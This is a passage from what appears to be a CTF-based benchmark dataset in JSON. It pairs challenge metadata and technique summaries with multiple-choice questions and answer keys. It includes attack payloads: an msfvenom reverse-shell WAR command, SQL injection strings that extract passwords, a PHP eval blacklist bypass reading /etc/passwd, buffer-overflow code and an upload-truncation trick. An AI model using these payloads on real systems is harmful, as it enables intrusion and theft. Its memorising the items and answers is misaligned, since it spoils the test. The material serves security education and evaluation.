            "If the correct password is unknown or unsuccessful guess attempts have been made, consider employing a brute force attack with steganography brute force tools like Stegseek, in conjunction with a comprehensive wordlist. This method systematically attempts numerous passwords until the correct one is found. For instances where the challenge author has disabled encryption within the steganography tool, it might be possible to retrieve the hidden message directly without needing the password.\n\n   Example payload for brute-forcing the password with Stegseek: `stegseek XMAS.jpeg crackstation-human-only.txt`"
        ],
        "question": [
            "When dealing with a \"Misc\" category challenge that involves JPEG files, and you suspect steganography has been used to hide information within these files, which tool is most likely to be effective for extracting hidden data, given that you have guessed the password correctly?  - A. tcpdump - B. Wireshark - C. Steghide - D. netcat ",
            "In a scenario where you have a JPEG file suspected of containing hidden data via steganography, but the correct password for extraction is unknown, which approach is recommended for attempting to uncover the hidden message?  - A. Manually inspecting the JPEG file's binary data. - B. Using a brute force attack with a tool like Stegseek and a comprehensive wordlist. - C. Employing an antivirus scan to detect hidden payloads. - D. Converting the JPEG file to another format to reveal the hidden data. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Percival PCAP Pandemonium Part 1",
        "write_up": "dataset/raw/Percival PCAP Pandemonium Part 1.md",
        "type": "misc",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 25,
        "max_score": 500,
        "difficulty": 0.05,
        "knowledge": [
            "When dealing with a challenge that involves analyzing PCAP files to extract specific information, tools such as Wireshark can be extremely helpful. Filter and inspect the content of packets to identify unique attributes or data related to embedded devices within a network, their interactions, or specific actions like device restarts.",
            "In challenges involving Unrestricted File Upload vulnerabilities leading to Remote Code Execution (RCE), it's crucial to identify the system version and search for public exploits that could be used or modified to achieve code execution. If direct exploitation fails due to version mismatches or specific configurations, consider creating a malicious file, such as a WAR file in Java web applications, and deploying it through available upload functionalities while bypassing security restrictions."
        ],
        "question": [
            "Which of the following is a correct approach to identify the IP address of an embedded device in a network using analyzed traffic in a PCAP file? - A. Reviewing the HTTP GET requests for unique patterns - B. Analyzing ARP traffic to observe request-response pairs - C. Inspecting DHCP traffic for IP allocation events - D. Filtering for TCP traffic on port 80 and observing device interactions ",
            "In a situation where an application is vulnerable to Unrestricted File Upload leading to RCE due to improper handling of `.war` file uploads, which of the following steps is crucial for successful exploitation? - A. Submit a `.jpeg` file with embedded malicious PHP code - B. Craft and upload a malicious `.war` file with a web shell integrated - C. Upload a large `.zip` file to exhaust server resources - D. Change the file extension from `.php` to `.phar` to bypass file upload restrictions "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Percival PCAP Pandemonium Part 2",
        "write_up": "dataset/raw/Percival PCAP Pandemonium Part 2.md",
        "type": "misc",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 75,
        "max_score": 500,
        "difficulty": 0.15,
        "knowledge": [
            "In scenarios involving exploitation of systems with exposed vulnerabilities, Python can be effectively utilized to create and deploy payloads for Remote Code Execution (RCE). This technique requires crafting a malicious file (e.g., a WAR file for web applications), staging it for deployment using crafted HTTP requests, and exploiting known system vulnerabilities. A common tool for generating such payloads is msfvenom, a part of the Metasploit framework. It's important to adjust the payload (e.g., LHOST, LPORT) to match the attacker's listener setup. After exploitation, maintaining access often involves utilizing uploaded files as web shells or connecting back to a listener on the attacker's machine.\n   \n   Example payload generation: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Attacker's IP] LPORT=[Listening Port] -f war > shell.war`",
            "When dealing with PCAP (Packet CAPture) files in CTF or cybersecurity analysis, tools like Wireshark can be used to dissect and analyze network traffic. Specifically, you can search for anomalies or specific packet types that indicate malicious activities or key events, such as device restart sequences or unauthorized access. In CTF challenges, looking for peculiar or out-of-place packets can lead to discovering flags or vital clues. Command-line tools like `tshark` can also automate searching patterns or extracting information from large PCAP files for efficiency.\n\n   Sample analysis approach: Inspect the PCAP file with Wireshark, looking for frames with unusual requests or responses (e.g., POST requests to unconventional endpoints), which could indicate the presence of an exploit or a significant event like a device reboot using specific commands or data packets."
        ],
        "question": [
            "For creating a malicious `.war` file to exploit an Unrestricted File Upload vulnerability leading to Remote Code Execution on a vulnerable system, which of the following msfvenom commands will correctly generate the payload? - A. msfvenom -p cmd/unix/reverse_python LHOST=x.x.x.x LPORT=1337 -f war > shell.war - B. msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1337 -f exe > shell.exe - C. msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=1337 -f war > shell.war - D. msfvenom -p java/jsp_shell_bind_tcp LHOST=x.x.x.x LPORT=1337 -f raw > shell.raw ",
            "In an analysis of PCAP data to identify an event that restarts an embedded device, you've identified an interesting frame related to the event. To answer a challenge question asking for the frame number that indicates the device restart, which approach is most effective? - A. Inspect the HTTP headers in each packet for clues related to device configuration changes. - B. Look for ARP requests to pinpoint sudden traffic surges indicating a reboot. - C. Search for specific frames indicating a reset command or anomaly in regular traffic suggesting a device restart. - D. Examine ICMP packets for echo requests indicative of initial device startup sequences. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "petushok",
        "write_up": "dataset/raw/petushok.md",
        "type": "This is a reverse challenge.",
        "competition": [
            "KasperskyCTF/2018",
            "https://ctftime.org/event/701/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with challenges that involve dynamically generated or server-side processed content, such as retrieving hidden or non-default files (e.g., backend scripts instead of conventional media files), modifying query parameters in the URL can be an effective technique. If the server processes parameters to determine which file to serve, changing these parameters to suspected or common file paths (e.g., \"main.py\", \"config.php\") can reveal server-side code or configurations that might expose vulnerabilities or important information for progressing in the challenge.",
            "In challenges where the objective is to find an input that makes the target function return a specific output (e.g., \"1\"), a brute-force approach can be employed efficiently if the function's behavior can be predicted or influenced by altering the input in a systematic way. Specifically, flipping bits at certain positions based on a condition or pattern determined by the application's logic can be a smart strategy. This approach is useful when direct analysis of the target function does not yield a straightforward way to calculate or guess the correct input. This method requires understanding how the function processes its input and determining an efficient way to iterate through possible inputs to find the one that produces the desired output.\n   Example payload/code snippet:\n   ```python\n   def brute_from(n, condition_idx):  \n       end_pos = (condition_idx + 104) % 137\n\n       if condition_idx >= 300:  \n           print(\"flag\", hex(n))  \n           exit()\n\n       q = check(n)  \n       if q[condition_idx % 137] == 1:  \n           brute_from(n, condition_idx+1)\n\n       n ^= 1 << end_pos  \n       q = check(n)  \n       if q[condition_idx % 137] == 1:  \n           brute_from(n, condition_idx+1)\n\n   brute_from(0, 0)\n   ```"
        ],
        "question": [
            "In the context of a web application where the content served is based on parameters specified in the URL, what technique can be leveraged to uncover server-side scripts or configurations that are not directly linked or accessible through the application's user interface? - A. Using a web crawler to automatically discover hidden directories and files - B. Modifying URL parameters to attempt accessing suspected file names or paths (e.g., changing the parameter value to \"config.php\" or \"main.py\") - C. Employing SQL injection to retrieve file names from the database - D. Using Cross-Site Scripting (XSS) to manipulate the DOM and reveal hidden elements",
            "When faced with the challenge of finding an input that causes a specific output in a function, and direct analysis does not reveal a straightforward solution, which approach could be appropriate for systematically identifying the correct input? - A. Using a rainbow table to look up precomputed outputs for known inputs - B. Employing a cryptographic hash function to encrypt inputs until the desired output is achieved - C. Iteratively flipping bits of the input based on the condition or pattern derived from the function's logic (e.g., using a bit manipulation strategy like `n ^= 1 << end_pos` to test alterations in the input's binary representation) - D. Applying machine learning algorithms to predict the input based on patterns learned from multiple function outputs"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Phish",
        "write_up": "dataset/raw/Phish.md",
        "type": "web",
        "competition": [
            "WeCTF/2021",
            "https://ctftime.org/event/1231/tasks/"
        ],
        "score": 592,
        "max_score": 2000,
        "difficulty": 0.296,
        "knowledge": [
            "In scenarios where an application's database interaction involves directly passing user input into SQL queries without proper sanitization or parameterization, it is prone to SQL Injection attacks. To test and exploit this vulnerability, one can craft input that alters the SQL query's logic to leak information or manipulate database actions. For example, injecting SQL control characters and comments can terminate the original query and append a malicious one. Example payload: `', (SELECT * FROM users WHERE username = 'admin'); --`",
            "When brute-forcing to identify characters or sequences present in a password (or any sensitive data) stored in the database, the SQL Injection can be extended with the `LIKE` operator for case-insensitive matches and `GLOB` for case-sensitive matches along with the use of wildcards. This approach leverages the error messages or unique database constraints to infer the presence or absence of specific characters or sequences. To effectively perform the brute-force under restrictions (e.g., rate limits), implement delay mechanisms in the automation script (`time.sleep` in Python). Example payloads for character presence testing include:\n   - Case-insensitive presence check: `a',(SELECT password FROM user WHERE username = \"shou\" AND password LIKE \"%{character}%\")); --`\n   - Case-sensitive sequence check using GLOB: `a',(SELECT password FROM user WHERE username = \"shou\" AND password GLOB \"{sequence}*\"));--`"
        ],
        "question": [
            "In a CTF challenge where an application's code is vulnerable to SQL Injection due to the lack of input sanitization in an SQL query for adding a user, which of the following payloads successfully exploits this vulnerability to extract information? - A. `'; DROP TABLE users; --` - B. `', (SELECT * FROM users WHERE username = 'admin'); --` - C. `admin' OR '1'='1` - D. `1; SELECT * FROM users`",
            "In a scenario where a Python script is used to brute-force the characters of a password using SQL Injection, and is encountering rate limits by the target server, which Python function should be added to the script to comply with the rate limit of no more than 10 requests per second? - A. `thread.sleep(0.1)` - B. `time.delay(0.1)` - C. `time.wait(0.1)` - D. `time.sleep(0.1)`"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "PHP Master",
        "write_up": "dataset/raw/PHP Master.md",
        "type": "The type of this CTF challenge is **web**.",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 33,
        "max_score": 500,
        "difficulty": 0.066,
        "knowledge": [
            "In PHP type juggling vulnerabilities, if the challenge involves comparison operators (`==` vs `===`), utilizing scientific notation can bypass weak type checks, since PHP compares the value irrespective of the type when using `==`. This can be effectively used when the script forbids certain characters or patterns in the input, but does not validate the datatype. Example payload: 1E2 == 100.",
            "When attempting to bypass filters that block specific characters (e.g., the letter \"e\" in a PHP script), changing the case of the character can evade the filter if the comparison is case-sensitive. This technique is applicable in scenarios where the filter implementation does not account for case variations of the blocked characters. Example payload: Use `1E2` to bypass a filter blocking `e`."
        ],
        "question": [
            "In a PHP-based application, when attempting to exploit a type juggling vulnerability involving comparison operators (`==` vs `===`), which of the following payloads would successfully trick the comparison such that both values are considered equal, but without directly comparing the same data types? - A. Use '100' == '100' to ensure strict equality without type coercion. - B. Employ '1e2' == '100' utilizing scientific notation to force PHP to interpret one as a float and the other as an integer. - C. Apply '1E2' === '100' trying to bypass strict type checking through case sensitivity. - D. Inject '0x64' == '100' expecting PHP to equate hexadecimal and integer values automatically.",
            "In the context of evading a filter within a PHP script that blocks the usage of the lower case letter \"e\", which approach would be suitable to bypass the filter without altering the semantic meaning of the payload? - A. Employing 'E' instead of 'e' in the payload, exploiting the case-sensitive nature of the filter. - B. Utilizing URL encoding to disguise 'e' as '%65', circumventing the filter's direct character matching. - C. Replacing 'e' with its equivalent ASCII code in a string format, misleading the simplistic nature of the filter. - D. Opting for a completely numerical representation of 'e' to avoid character-based filtering altogether."
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "PHP+1",
        "write_up": "dataset/raw/PHP+1.md",
        "type": "The type of the CTF challenge in this write-up is a **web** challenge.",
        "competition": [
            "InCTF/2019",
            "https://ctftime.org/event/849/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When dealing with PHP `eval()` and a blacklist that prevents the direct use of internal functions, you can bypass the filter by breaking down the function names into concatenatable string fragments and using an intermediary, non-blacklisted function or variable to represent characters filtered out by the blacklist (e.g., underscores). This technique allows execution of otherwise restricted functions within the `eval()` context. For instance, if underscores are filtered and you need to execute `highlight_file()`, you can bypass the blacklist by concatenating strings and using a directory name with an underscore for reference:  \nExample payload: `/?input=eval(\"highlight\".$thisfille[8].\"fil\".\"e('/etc/passwd');\");&thisfile=/lib/x86_64-linux-gnu`",
            "In environments where direct file and directory listing functions such as `scandir()` are disabled for security reasons, alternative methods such as `glob()` can be utilized for directory listing. This method proves useful when needing to identify files or directories of interest, such as when searching for a flag file in a CTF challenge. If `glob()` is not disabled, it can effectively bypass restrictions on directory listing, revealing paths that may be accessed or exploited further to achieve objective goals, like obtaining a flag.  \nExample usage: To list all items in the root directory, an attacker could use: `/?input=eval('print'.$thisfille[8].'r(glo'.'b(\\'/*\\'));');&thisfile=/lib/x86_64-linux-gnu`"
        ],
        "question": [
            "In a PHP `eval()` context, which of the following payloads successfully bypasses a blacklist that filters out underscore characters and prevents the direct use of internal function names like `highlight_file()`? - A. `/?input=eval(\"highlight\".\"_file('/etc/passwd');\");&thisfile=/var/www/html` - B. `/?input=eval(\"highlight\".$thisfile[8].\"file('/etc/passwd');\");&thisfile=/var_www_html` - C. `/?input=highlight_file('/etc/passwd');&thisfile=/var/www/html` - D. `/?input=eval(\"highlight_file('/etc/passwd');\");&thisfile=/var/www/html` ",
            "When `scandir()` function is disabled in a PHP environment, which method can be used to list directories as an alternative, especially in a constrained environment like a Capture The Flag (CTF) challenge? - A. Using the `ls` command with `exec()`. - B. Utilizing the `readfile()` function to list directory contents. - C. Employing `glob()` to match and print directory contents. - D. Implementing `dir()` function to get directory class instance and list contents. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Pinch me",
        "write_up": "dataset/raw/Pinch me.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When encountering binary exploitation challenges that involve a buffer overflow vulnerability, one effective approach is to overflow the buffer in a way that manipulates adjacent variables or return addresses on the stack to control program flow. Specifically, when a variable or condition check that triggers a sensitive operation like spawning a shell is stored adjacent to a buffer, one can overflow the buffer up to that variable and overwrite its value to meet the condition. Generally, this involves sending a payload that fills the buffer up to the target variable and appending the desired value for the variable at the end. Example payload in Python using pwnlib:  \n```python\nbuffer_overflow = b'a'*24  # Fills the buffer\nbuffer_overflow += p64(0x1337c0de)  # Overwrites adjacent variable to meet the condition\n```",
            "In binary exploitation, particularly where input is read using functions like `fgets`, understanding the exact amount of data the buffer can hold and the target data's location in memory is crucial for crafting a precise overflow payload. This technique allows for controlled execution of unintended instructions (in this scenario, spawning a shell). When the code checks if a specific variable equals a certain value to trigger an action, calculating the exact overflow size to overwrite that variable with the desired value is key. This requires analyzing the binary's control flow and variable allocation, preferably with tools like Ghidra."
        ],
        "question": [
            "In a binary exploitation challenge, which Python function from the 'pwn' library should be used to correctly append a specific value after overflowing a buffer to manipulate a variable's value for controlling the program's flow? - A. p64(0x1337c0de) to append a 64-bit value - B. p32(0x1337c0de) to append a 64-bit value incorrectly using a 32-bit function - C. pack(0x1337c0de) attempting to use a non-existent 'pack' function - D. append(0x1337c0de) incorrectly assuming a basic Python list method applies",
            "In the context of utilizing `fgets` for a buffer overflow to spawn a shell, understanding the buffer's capacity and the target variable's memory location is critical. If `fgets` reads `100` bytes into a buffer of `24` bytes, causing an overflow into an adjacent variable `local_10` required to meet a condition, how many bytes of data must be sent before appending the desired value to manipulate `local_10`? - A. 24 bytes to meet the start of `local_10` - B. 100 bytes misunderstanding buffer capacity as the requirement - C. 76 bytes incorrectly calculating overflow requirements - D. 128 bytes overestimating the needed overflow"
        ],
        "answer": [
            "A.",
            "A."
        ]
    },
    {
        "name": "PixEditor",
        "write_up": "dataset/raw/PixEditor.md",
        "type": "crypto",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 350,
        "max_score": 600,
        "difficulty": 0.5833333333333334,
        "knowledge": [
            "To bypass file extension checks on web applications that restrict uploads to certain file types but truncate the filename after validation, one can append a permitted extension followed by a disallowed one, ensuring the total filename length exceeds the truncation limit. This will result in the server-side saving of the file with the disallowed extension actually being effective. For example, to bypass a restriction allowing only `.png` files but intending to upload a `.php` file for server-side code execution, one can name the file with a sufficient number of characters followed by `.php.png`. The server truncates the filename post-validation, removing the `.png`, thus saving it as a `.php` file.",
            "When embedding PHP code in file types other than `.php`, like images, taking advantage of file formats that directly translate pixel color data (in formats like BMP) into file bytes can be crucial. Since PHP interpreters only require the presence of valid PHP code within a file and disregard non-PHP content, an effective payload can be crafted by encoding the PHP code into the pixel data. This process involves dividing the PHP payload into three-byte chunks and mapping these onto the RGB values of pixels in an image. This technique requires consideration of the image format's color storage methodology (e.g., BMP uses BGR, not RGB) and might necessitate adjustments for alpha channels or color inversion based on the image format specifications. The encoded image, when uploaded (under conditions allowing execution, such as having a `.php` extension through truncation), will then execute the embedded PHP code on the server. Example payload crafting (simplified): encode each byte of the PHP code into the RGB values of consecutive pixels, ensuring to adjust for any format-specific quirks like byte order or alpha channel handling."
        ],
        "question": [
            "In a web application that restricts file uploads to specific extensions such as `.jpg`, `.png`, `.bmp`, or `.gif`, how can you bypass the extension check to upload a `.php` file for server-side code execution?  - A. Append `.php` before the allowed extension and ensure the filename is short enough to avoid truncation. - B. Upload the file with a double extension like `.php.jpg` without worrying about filename length. - C. Utilize an allowed extension followed by `.php` and ensure the entire filename is longer than the truncation limit, causing the server to save it with a `.php` extension after truncation. - D. Change the file's MIME type to `text/php` while keeping an allowed extension in the filename. ",
            "When crafting an executable PHP payload in an image format like BMP for a web application vulnerability, how should you encode your payload into the BMP's pixel data to ensure server-side PHP code execution?  - A. Convert the payload into hexadecimal format and use each byte to set the color values of consecutive pixels without any modification. - B. Encode the PHP payload as a base64 string and map it directly onto the image pixels' RGB values. - C. Split the PHP payload into three-byte chunks, inverting these for the RGB values of each pixel to comply with BMP\u2019s BGR format, and ensure any alpha channel bytes are skipped. - D. Compress the PHP payload using ZIP compression, then map it across the pixels' RGBA values in sequence. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Pixelify",
        "write_up": "dataset/raw/Pixelify.md",
        "type": "misc",
        "competition": [
            "darkCON/2021",
            "https://ctftime.org/event/1250/tasks/"
        ],
        "score": 474,
        "max_score": 500,
        "difficulty": 0.948,
        "knowledge": [
            "In challenges dealing with images, where the hint or challenge context suggests that data might be hidden or encoded within the image, one effective method is to consider how individual pixels might encode data. Specifically, if the challenge involves encoding a file into an image by mapping file data onto pixel colors, each set of pixels (e.g., groups of four pixels) can represent a byte or other data unit. To extract such hidden data, a script can be written to reverse the mapping process by correlating specific pixel colors back to data values, and then potentially decoding from base64 or a similar encoding if used. This method hinges on recognizing the encoding scheme from the provided scripts or hints.\n\nExample Python snippet (extracted and simplified from the detailed script):\n```python\nfrom PIL import Image\nimport base64\n\ndef extract_data_from_image(image_path):\n    img = Image.open(image_path)\n    pixels = img.load()\n    data = ''\n\n    for i in range(0, img.size[0]*img.size[1], 4): # Assuming 4 pixels per data unit\n        byte = [pixels[i % img.width, i // img.width]]\n        # Process bytes according to the specific color to data mapping\n        # ...\n\n    decoded_data = base64.b64decode(data)\n    return decoded_data\n\n# Usage\nextracted_data = extract_data_from_image(\"inject.png\")\nprint(extracted_data)\n```",
            "When encountering a binary or a compiled payload in security challenges, especially those hinting at hidden or malicious content, it is crucial to consider decompilation or decoding tools specific to the file type suggested by hints or explicit file extensions. For files hinted to be payloads (e.g., rubber ducky payloads indicated by a binary with a suggestive name or context), tools such as Duck-Decoder or similar payload decompilers can be utilized to reverse engineer the compiled file back to a more understandable form or script, which might reveal hidden messages, commands, or flags. It's important to use the right tool for the file type indicated, both to ensure success in decoding and to avoid potential security risks from handling the file.\n\nExample tool usage (assuming you have identified the file as a rubber ducky payload):\n```\npython DuckDecoder.py -i inject.bin -o decoded_script.txt\n```"
        ],
        "question": [
            "In a challenge where an image is used to encode file data into pixel colors, with each byte represented by a set of four pixels using a specific color mapping, how would you process and decode the data from such an image in Python? - A. Use a `for` loop to iterate over each pixel, map each set of four pixels to a byte, and decode the final string with hex. - B. Manually extract each pixel value, concatenate them, and use a `hex` function to decode. - C. Iterate through the image pixel by pixel, use an external API to convert the colors to binary data, and then decode from binary. - D. Iterate over the image in sets of four pixels, map pixel colors back to data values, and decode from base64 after reassembling the bytes.",
            "Which tool would be most appropriate for decoding or decompiling a file that is suggested to be a rubber ducky compiled payload based on the challenge context or file name hints? - A. Use a generic text editor to manually interpret the binary data. - B. Employ a standard image editing software to visually decode the payload. - C. Utilize a specific tool like Duck-Decoder to decompile the rubber ducky payload into a readable script. - D. Apply a common programming IDE's debugging features to reverse engineer the payload."
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Plaidflix",
        "write_up": "dataset/raw/Plaidflix.md",
        "type": "pwn",
        "competition": [
            "PlaidCTF/2021",
            "https://ctftime.org/event/1199/tasks/"
        ],
        "score": 250,
        "max_score": 450,
        "difficulty": 0.5555555555555556,
        "knowledge": [
            "When faced with a use-after-free vulnerability, one can leverage it to leak heap and libc addresses, which are essential for bypassing ASLR (Address Space Layout Randomization) and facilitating further exploitation. This is particularly useful when an application allows for manipulation of data structures (like adding/removing friends in a social network scenario) that are referenced after being freed. This method involves interacting with the application to induce a use-after-free condition, then displaying or triggering actions that access the dangling pointer to leak memory addresses.",
            "To bypass the glibc's safe linking protection\u2014a feature designed to mitigate exploitation techniques such as heap spraying and unlink attacks\u2014one can employ either direct computation methods to reverse the encoded pointers or use SMT solvers to systematically find the original heap pointers. Safe linking protection involves XORing a pointer with a location-shifted version of itself, a mechanism that can be reversed if the attacker has knowledge about the higher bits of the address or can guess them. This knowledge is crucial when exploiting heap vulnerabilities in systems with glibc version 2.32 or newer, where safe linking is enabled.\n\n   Example SMT solver usage for reversing safe linked pointers:\n   ```python\n   def unsafe_link(e):\n       high_e = e & 0xfffffff000000000\n       x = BitVec('x', 64)\n       s = Solver()\n       s.add(x & 0xfffffff000000000 == high_e)\n       s.add(x ^ (x >> 12) == e)\n       s.check()\n       return s.model()[x].as_long()\n   ```"
        ],
        "question": [
            "In the context of exploiting a use-after-free vulnerability for bypassing ASLR in applications like a social network service, which technique is essential for leaking heap and libc addresses? - A. Inducing buffer overflow to rewrite adjacent memory areas - B. Manipulating data structures such as adding or removing items to reveal memory addresses - C. Employing static analysis to uncover hidden memory addresses - D. Leveraging SQL injection to extract server memory details",
            "Given the introduction of safe linking in glibc version 2.32 to mitigate heap exploitation, which method is appropriate for reversing the encoding of a pointer obscured by this mechanism? - A. Utilizing an SMT solver to systematically find the original pointer values based on known high bits and the encoded form - B. Decrypting the pointer using standard cryptographic techniques - C. Performing a brute-force attack on the application to reveal the pointer - D. Analyzing network traffic to infer encoded pointers"
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "Please Click All the Things 3_ IceID 350",
        "write_up": "dataset/raw/Please Click All the Things 3_ IceID 350.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1.0,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When analyzing phishing emails or attachments, tools such as Outlook can be particularly useful for accessing and analyzing necessary features with ease. However, for those without access to certain software or licenses, alternative tools like oledump can be utilized to extract and investigate macro scripts from documents.",
            "In challenges involving obfuscated or encoded data, CyberChef is an effective tool for decoding various types of encoding schemes. This tool can significantly streamline the process of revealing hidden or obfuscated information within files, making it easier to uncover potential malicious payloads or exfiltrate data related to the challenge."
        ],
        "question": [
            "When investigating a potential phishing email attachment, if you lack access to Outlook with the necessary features, which of the following tools is recommended for extracting and analyzing macro scripts within the documents?  - A. Wireshark - B. oledump - C. Metasploit - D. Nmap ",
            "In the context of decoding various types of encoding schemes found within files during a cybersecurity challenge, which tool is considered most effective for uncovering hidden or obfuscated information?  - A. GDB - B. CyberChef - C. Burp Suite - D. IDA Pro "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "PleaseClickAlltheThings 1_ BegineersRITSEC",
        "write_up": "dataset/raw/PleaseClickAlltheThings 1_ BegineersRITSEC.html 150.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1.0,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When analyzing malicious HTML files or macro-based malware as part of a forensic investigation in a CTF challenge, tools such as Outlook (with proper licensing for accessing enhanced features) or oledump can be effectively used to extract and examine the content without directly executing potential malware. This approach allows for safe inspection and analysis of the file\u2019s contents, which is critical in identifying embedded malicious codes or artifacts.",
            "CyberChef is an exceptional tool for decoding and analyzing various encoding schemes and data formats encountered in malicious artifacts within CTF challenges. Its extensive range of operations makes it suitable for decoding complex encodings and obfuscations found in malware samples or malicious documents, thereby revealing hidden or obscured information such as flags or indicators of compromise (IoCs)."
        ],
        "question": [
            "When tasked with analyzing a malicious HTML file in a forensic investigation of a CTF challenge without directly executing the malware, which of the following tools would be the most appropriate to safely extract and examine the file\u2019s content?  - A. Microsoft Paint - B. Outlook or oledump - C. Adobe Acrobat Reader - D. Notepad++ ",
            "In the context of conducting forensic analysis on malware samples and malicious documents in CTF challenges, which tool is recommended for decoding and analyzing various encoding schemes and data formats to reveal hidden or obscured information?  - A. CyberChef - B. Microsoft Excel - C. VLC Media Player - D. Adobe Photoshop "
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "PleaseClickAlltheThings 2_ GandCrab_Ursnif 200",
        "write_up": "dataset/raw/PleaseClickAlltheThings 2_ GandCrab_Ursnif 200.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1.0,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When analyzing potentially malicious documents such as HTML files that may contain obfuscated JavaScript or macros as part of a phishing attempt, tools like CyberChef can be very useful for decoding or deobfuscating the content. This process is crucial for identifying hidden malicious code without executing it, thus mitigating risk. CyberChef, in particular, provides a range of decoders and parsers that can handle several encoding schemes used by attackers to conceal their code.",
            "For examining and analyzing Office documents that might contain macros which are not obviously malicious or when dynamic analysis does not reveal the full behavior of the code, tools such as oledump can be used. This is particularly true in IR (Incident Response) scenarios where the document might not exhibit malicious behavior upon execution due to anti-analysis techniques or environment checks. Oledump can assist in extracting and inspecting macros from Office files, allowing for a more thorough static analysis to understand the potential impact without needing the Office suite itself.\n\nExample payload: Cannot be provided as these points discuss analysis techniques rather than exploit development."
        ],
        "question": [
            "While investigating a suspected phishing email that includes an HTML attachment, you decide to examine the attachment for obfuscated JavaScript potentially containing malicious code. Which tool is best suited for decoding or deobfuscating this content to identify the hidden code without executing it? - A. Nmap - B. Wireshark - C. CyberChef - D. Metasploit",
            "In the process of responding to an incident involving a suspicious Office document believed to contain hidden malicious macros, you need a tool that can extract and allow you to inspect these macros for detailed analysis. The document's behavior does not fully reveal itself through dynamic analysis due to possible anti-analysis checks. Which tool would be most appropriate for your static analysis needs in this scenario? - A. Ghidra - B. oledump - C. Nessus - D. Burp Suite"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "PlusMinus",
        "write_up": "dataset/raw/PlusMinus.md",
        "type": "The type of challenge described in this write-up is a **crypto** challenge.",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 101,
        "max_score": 500,
        "difficulty": 0.202,
        "knowledge": [
            "When tackling arithmetic expression challenges, using a binary expression tree approach allows for easy representation and manipulation of expressions. By constructing a binary tree where inner nodes are operators and leaves are numbers, one can systematically explore all possible combinations of operations without relying on parentheses. This method simplifies the process by focusing on the structure rather than the syntax of expressions, enabling efficient enumeration of all possible solutions to find the right one.",
            "Implement a recursive solution to effectively explore all combinations of arithmetic operations for a given sequence of numbers while maintaining their original order. This involves splitting a list of numbers into all possible two-part partitions, recursively solving for each partition, and then combining these partitions using all allowed operations (+, -, *, /). Use memoization to avoid redundant computations of the same subproblems, significantly reducing the time and computational resources required. This approach is effective for solving problems with a manageable number of elements due to the exponential increase in possibilities as the number of elements grows.\n\nExample payload or approach (in pseudo-code):\n```python\ndef recursive_solve(nums, target=None):\n    # Base case: single element (leaf node)\n    if len(nums) == 1:\n        return nums[0] if nums[0] == target else None\n    # Recursive case: split and explore combinations\n    for i in range(1, len(nums)):\n        left, right = nums[:i], nums[i:]\n        # Recurse on left and right partitions\n        left_results = recursive_solve(left)\n        right_results = recursive_solve(right)\n        # Combine results with operations\n        for op in ['+', '-', '*', '/']:\n            combined_result = evaluate(left_result, op, right_result)\n            if combined_result == target:\n                return format_expression(left_result, op, right_result)\n    # Handle no solution found or memoization as needed\n```\nThis pseudo-code conceptually outlines the recursive exploration of all arithmetic combinations, where `evaluate` and `format_expression` are hypothetical functions to calculate and format the results of operations, respectively."
        ],
        "question": [
            "Which method can simplify the process of exploring all possible combinations of arithmetic operations in a given sequence of numbers by focusing on the structure rather than the syntax of expressions? - A. Implementing a linear scanning algorithm that evaluates expressions from left to right without considering operator precedence. - B. Using a binary expression tree approach where inner nodes are operators and leaves are numbers, which allows for systematic exploration of operations without relying on parentheses. - C. Applying a brute-force search that generates and evaluates every possible permutation of the numbers and operators, including all variations of parentheses placements. - D. Constructing a regular expression pattern that matches valid arithmetic expressions and iterates over all possible strings to find matches.",
            "What is a critical step in implementing a recursive solution for exploring all combinations of arithmetic operations that maintains the original order of a given sequence of numbers? - A. Using a genetic algorithm that evolves the best solution over iterations, selectively combining parts of successful attempts. - B. Applying a depth-first search that prioritizes reaching the end of the number sequence before backtracking to explore alternate paths. - C. Splitting a list of numbers into all possible two-part partitions, recursively solving for each partition, and then combining these partitions using all allowed operations (+, -, *, /). - D. Encoding the sequence of numbers as a matrix and applying linear algebra operations to find combinations that satisfy the arithmetic conditions."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "poetry",
